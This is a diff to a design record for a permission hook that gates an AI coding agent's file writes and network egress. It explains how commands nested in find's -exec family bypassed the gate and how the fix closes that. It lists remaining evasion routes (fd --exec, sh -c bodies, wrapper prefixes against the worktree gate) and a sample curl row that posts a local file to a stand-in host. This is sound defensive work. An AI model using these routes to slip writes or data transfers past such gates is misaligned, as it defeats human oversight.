@@ -560,7 +560,9 @@ survived long enough to be quoted in three other documents as a bare list item.
 - `find -exec` / `-execdir`. A DIFFERENT MECHANISM: the nested command sits inside an
   argument list with a terminator (`\;`, `';'` or `+`), not in front of the command, so no
   prefix step can reach it. All four spellings were measured silent, and the four silences
-  are pinned as tests so the deferral is visible rather than assumed.
+  are pinned as tests so the deferral is visible rather than assumed. (This deferral is
+  CLOSED by the cycle Q amendment below, which also records that the family is four flags
+  and not two: `-ok` and `-okdir` were silent too and were named nowhere here.)
 - DELETION. `rm` and `rm -rf` remain out of scope for this gate by recorded ruling, so
   `find . | xargs rm` STAYS silent after the fix. Pinned, so the prefix closure is not
   read as smuggling deletion into scope.
@@ -598,3 +600,240 @@ only; and a write LANDING ON DISK through the full Claude Code path, which a Pre
 hook test cannot show at all and which is therefore left unclaimed. INFERRED, not
 measured: `timeout 5 git worktree remove x` evading the worktree gate by the same
 mechanism.
+
+## Amendment (cycle Q): a nested command inside an argument list
+
+Same seam, fifth instance, and this time the prefix mechanism could not reach it at all.
+find's exec family carries a whole command as ARGUMENTS, ended by one of find's own
+terminator tokens. `verb_at` returns ONE verb per segment and returns at the first
+non-`WRAPPERS` name, so `cmd0` for the whole segment was `find`, which matches none of the
+four write arms and none of `EGRESS_VERBS`. The nested command produced no target, reached
+no gate and left no audit row.
+
+### Measured before the fix
+
+Through the write gate's own embedded extractor with `WRIT_CWD=/proj`:
+
+```
+find . -name x -exec cp {} src/y.py \;                              -> set()
+find . -name x -exec cp {} src/y.py ';'                             -> set()
+find . -name x -exec cp -t src {} +                                 -> set()
+find . -name x -execdir cp {} src/y.py \;                           -> set()
+find . -name x -ok cp {} src/y.py \;                                -> set()
+find . -name x -okdir cp {} src/y.py \;                             -> set()
+find . -name x -exec tee src/y.py \;                                -> set()
+find . -name x -exec sed -i s/a/b/ src/y.py \;                      -> set()
+find . -name x -exec curl -d @src/a.txt https://example.invalid \;  -> set()
+
+find . -name x -print                                    -> set()                (control)
+find . -name x | xargs cp -t src                         -> local /proj/src      (control, cycle P)
+find . -name x -exec cp {} src/y.py \; ; cp seed.txt src/z.py
+                                                         -> local /proj/src/z.py (control)
+```
+
+The third control is the one that mattered: only the nested command was lost, and the
+segmentation around the construct was already intact.
+
+Re-measured after the fix, same harness, same `WRIT_CWD`: the first six rows yield the
+nested command's own destination (`local /proj/src/y.py`, and `local /proj/src` for the
+`-t src` batch row), the `tee` and `sed -i` rows yield `local /proj/src/y.py`, the `curl`
+row yields the egress host `example.invalid`, `-print` is still silent, the `xargs` control
+is unchanged, and the third control now yields BOTH `local /proj/src/y.py` and
+`local /proj/src/z.py`.
+
+### Decision: one splice, not a fifth arm
+
+Each nested-command span is appended to `segments` as an ADDITIONAL entry, piped flag
+FALSE, immediately after the segment loop finishes and before any pass runs:
+
+```python
+NESTED_CMD_FLAGS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
+NESTED_TERMINATOR_CHARS = frozenset({";", "+"})
+
+for _seg, _piped in list(segments):
+    for _span in nested_command_spans(_seg):
+        segments.append((_span, False))
+```
+
+The write loop then resolves `cmd0 = cp` for that entry and the egress loop resolves
+`verb = curl`, with NO change to any write arm, no change to any egress arm and no change
+to `verb_at`. The original `find` segment stays in the list: its `cmd0` is `find`, it
+matches no arm, and its redirect scan keeps working, so `find ... -exec ... \; > log.txt`
+still gates `log.txt`.
+
+The egress half comes free rather than needing a second cycle for exactly one structural
+reason: the write pass, the inline-interpreter pass and the egress pass are three loops
+over the SAME `segments` list. One splice feeds all three, and the interpreter pass picking
+up `find . -exec python3 -c "..." \;` is a third consequence of the same line, pinned as a
+capability rather than left as a side effect nobody noticed.
+
+Two alternatives were rejected, and the reasons belong in the record:
+
+- A FIFTH `cmd0` arm for `find` would have to re-implement the destination logic of all
+  four existing arms (the `tee` argument loop, `dd of=`, the `cp`/`mv`/`install` last
+  positional plus its three `-t` spellings, and `sed -i`'s last positional), and it would
+  not touch egress at all, so the transfer half would need its own cycle.
+- Refactoring the per-segment body into a shared function callable on a nested span would
+  rewrite the code path every existing test in this family runs through, for no coverage
+  the splice does not already buy.
+
+The helper sits OUTSIDE the `MIRROR BEGIN/END split_control_operators` block on purpose.
+That block is byte-compared across three copies, so putting the splice inside it would
+force an identical change to `writ/session/bash_tokens.py` and would change
+`writ-worktree-safety.sh` behavior on unmeasured evidence.
+
+### Span boundaries, and why they are reliable
+
+The spans are derived PER SEGMENT, from the already-built list, not from the raw token
+stream, which makes a control operator a hard stop for free: a span cannot cross a segment
+boundary because the boundary split happened first. A span runs from the token after the
+flag to the terminator, or to the END of the segment when there is none.
+
+Every terminator survives tokenization as a distinct token and none of them becomes a
+`CONTROL` member. MEASURED token forms: `\;` gives `'\\;'`, `';'` gives `"';'"`, `";"`
+gives `'";"'`, and `+` gives `'+'`. A BARE `;` never appears inside a segment at all,
+because it IS a `CONTROL` token and has already ended the segment before the splice runs.
+The list is SNAPSHOTTED before splicing, so a spliced span is never itself rescanned: one
+level is every level find has, and re-entering would be an unbounded loop for no coverage.
+
+### The flag family was undercounted
+
+FOUR flags, which is two more than the header used to name. `-ok` and `-okdir` prompt the
+user before each command and then RUN it, so both are write vectors exactly as `-exec` and
+`-execdir` are. Both were measured silent, and both were named NOWHERE before this cycle:
+not in the header's uncovered block, not in this ADR, not in any test. A disclosure that
+misstates the SIZE of a hole is what stops the next reader re-examining it, which is the
+same failure the cycle P amendment recorded about a false reason.
+
+No count is pinned anywhere. The new test module derives its flag axis from the hook's own
+`NESTED_CMD_FLAGS` and asserts the axis EQUALS that set, so a fifth spelling added later
+reddens the axis-equality test instead of sitting outside a stale literal.
+
+### The batch form's real constraint
+
+EXECUTED against GNU findutils 4.9.0 on the implementing machine:
+
+```
+find . -maxdepth 0 -name __nomatch__ -exec cp {} dest +
+    -> find: missing argument to `-exec'   (exit 1)
+find . -maxdepth 0 -name __nomatch__ -ok cp -t dest {} +
+    -> find: missing argument to `-ok'     (exit 1)
+```
+
+The first says `{}` must be the trailing argument under `+`, so under `+` a destination is
+reachable only as a FLAG VALUE (`cp -t DIR {} +`) and NO detector for `cp {} dest +` is
+built, because that command can never run. The second was INFERRED by the plan from find's
+documentation and is now MEASURED: `+` is rejected for `-ok` as well, so the test module's
+batch-terminator axis stays the two flags and does not widen to all four. The `;` family
+has no ordering constraint, so a destination may sit anywhere in the nested argument list,
+and its consumer set is therefore the wider one.
+
+### Accepted costs
+
+`{}` is find's placeholder, not a path. The two brace discards elsewhere in the hook
+(`CODE_PUNCT` in `token_literals`, the brace skip in `scan_tokens`) are on the INTERPRETER
+path only, not on the `cmd0` write arms. So a spelling that puts the placeholder in
+DESTINATION position emits a row naming the placeholder: MEASURED,
+`find . -name x -exec tee {} \;` and `find . -name x -exec sed -i s/a/b/ {} \;` each yield
+`local /proj/{}`. Three treatments were weighed and the chosen one is to leave the
+placeholder alone and PIN the row:
+
+- Skipping brace-bearing targets globally at the normalization point also changes non-find
+  behavior, turning a real `echo x > src/{a}.py` into silence. MEASURED as still collected
+  (`local /proj/src/{a}.py`) both before and after this cycle, and pinned, so the
+  alternative's cost is executable rather than argued.
+- Dropping `{}` tokens out of the span is actively worse for the `sed` arm, whose "last
+  positional is the file" heuristic then reads the SCRIPT as the file, and it leaves
+  `tee {}` with no argument at all.
+
+The row is fail-closed and strictly better than the silence it replaces: a real in-place
+bulk edit now reaches the work gate instead of no gate at all, and the only thing wrong is
+the TEXT of a path that no single file can be named for. When the placeholder is a SOURCE
+rather than a destination the cost does not arise at all, because the arm takes the last
+positional: `-exec cp {} src/y.py \;` yields the real destination.
+
+The second cost is that the flags are matched as a MECHANISM on the RAW token and NOT
+conditioned on the segment's verb being `find`, which follows this file's own posture at
+`WRAPPER_POSITIONALS`: fail-closed for the verb, fail-open for detection, where an extra
+row for a command that never runs is cheaper than a lost row for one that does. The
+consequences, both MEASURED and both pinned:
+
+- A QUOTED mention opens no span, because `shlex(posix=False)` leaves the quote characters
+  on. `grep -- '-exec cp {} src/y.py' src/notes.txt`, `echo "-exec cp {} src/y.py"` and
+  `git commit -m "use -exec cp {} src/y.py"` are all still silent after the fix. This is
+  the discrimination the mechanism has to make, and it is the same rule
+  `strip_group_opener` applies to a quoted group opener.
+- An UNQUOTED mention in any command's arguments DOES open a span, whatever the verb, so
+  `echo find . -exec cp {} src/y.py`, `somecmd -exec cp {} src/y.py \;` and
+  `myscript --pattern -exec cp {} src/y.py \;` each emit `local /proj/src/y.py` for a
+  command that writes nothing. That is the accepted cost, and it survives `\find`, an
+  alias, and a wrapper-prefixed find, which conditioning on `verb_at(seg)[0] == "find"`
+  would not.
+
+### Deferred, each for a stated reason
+
+- DELETION, by the recorded ruling in the hook's irreversible-destruction block ("rm -rf,
+  DROP TABLE and TRUNCATE are OUT OF SCOPE on purpose"). MEASURED after the fix:
+  `find . -name x -exec rm {} \;` and `find . -name x -delete` are both still silent,
+  because `rm` matches no `cmd0` arm and `-delete` carries no nested command. Both pinned,
+  so the closure is not read as smuggling deletion into scope. Neither command matches the
+  hook's cheap early-exit globs either, so through the full hook they never even reach the
+  extractor: the extractor-level pins are the tighter assertion of the two.
+- The worktree gate's OWN exposure. `find . -exec git worktree remove x \;` evading
+  `writ-worktree-safety.sh` is INFERRED from that hook's source, not measured, and is
+  deferred for exactly the reason cycle P gave for not growing that hook's prefix set: its
+  parsing is permissive-only by design and a change there would be a second unmeasured
+  change.
+- `fd --exec` / `fd -x`. The SAME nested-command mechanism under another tool's flag
+  spellings, which `NESTED_CMD_FLAGS` does not carry. NOT MEASURED, so it is recorded as a
+  stated suspicion and it takes find's place in the header's names-only block.
+- `sh -c` inside a nested command, unchanged. MEASURED still silent:
+  `find . -name x -exec sh -c 'cp seed.txt src/y.py' \;` yields nothing, because the body
+  is ONE token and no `cmd0` arm matches it. That is the already-disclosed `sh -c` limit,
+  not a new one.
+- Resolving find's SEARCH ROOT into the placeholder. find's path operands precede its
+  expression and may repeat, so this is a separate mechanism and is deliberately not
+  attempted. The residue is stated below.
+
+### The residue is executable, not only prose
+
+The placeholder row always resolves under the cwd even when find's search root is
+elsewhere, so an out-of-repo bulk in-place edit is reported as `local` rather than
+`outside` and does not reach the project-boundary refusal that the DIRECT spelling of the
+same write does reach. That asymmetry is a test with the direct spelling beside it as the
+contrast, so a future cycle that resolves find's search roots has a red test to turn green
+rather than a paragraph to rediscover. It is under-detection relative to a perfect gate and
+strictly more detection than the total silence it replaces.
+
+The machine-readable residue grew a second half. The header's names-only block between
+`# UNCOVERED PREFIXES BEGIN` and `# UNCOVERED PREFIXES END` no longer names find's flags,
+and the ratchet that reads it now derives TWO covered populations: the hook's own
+`WRAPPERS` keys AND its own `NESTED_CMD_FLAGS`. Naming a covered prefix as uncovered,
+closing a prefix without updating the block, and closing a nested-command FLAG without
+updating the block all redden there.
+
+### The order of the changes was itself a trap
+
+Removing find's flags from the names-only block reddens EXACTLY ONE assertion and does NOT
+redden the behavior test that asserted `set()`. So the block edit alone would produce a
+file whose header reads "closed" while a green behavior test still pinned the hole open.
+The block edit, the behavior fix and the rewritten behavior test therefore landed in the
+SAME commit, and that was checked explicitly before the commit rather than left to chance.
+
+### Measured versus inferred
+
+MEASURED: the nine silences and the three controls above, before the fix and again after
+it, through the extractor with `WRIT_CWD=/proj`; the four terminator token forms; both
+findutils 4.9.0 rejections, executed with exit codes; the two placeholder rows
+(`local /proj/{}` for `tee {}` and for `sed -i s/a/b/ {}`); the braced-path control
+(`echo x > src/{a}.py` still collected); the three quoted mentions staying silent and the
+three unquoted mentions emitting a row; the two deletion spellings staying silent; and the
+real hook's `permissionDecision` for two nested commands, an egress ask naming the host and
+a credential deny carrying `[SEC-CREDENTIAL-WRITE]`.
+
+NOT MEASURED, stated plainly rather than implied: the real hook's `permissionDecision` for
+a nested project WRITE, which is proved at the extractor layer only, the same boundary every
+earlier cycle in this family recorded; and a write LANDING ON DISK through the full Claude
+Code path, which a `PreToolUse` hook test cannot show at all. INFERRED, not measured:
+`find . -exec git worktree remove x \;` evading the worktree gate, and `fd --exec` carrying
+the same mechanism under a spelling this fix does not cover.
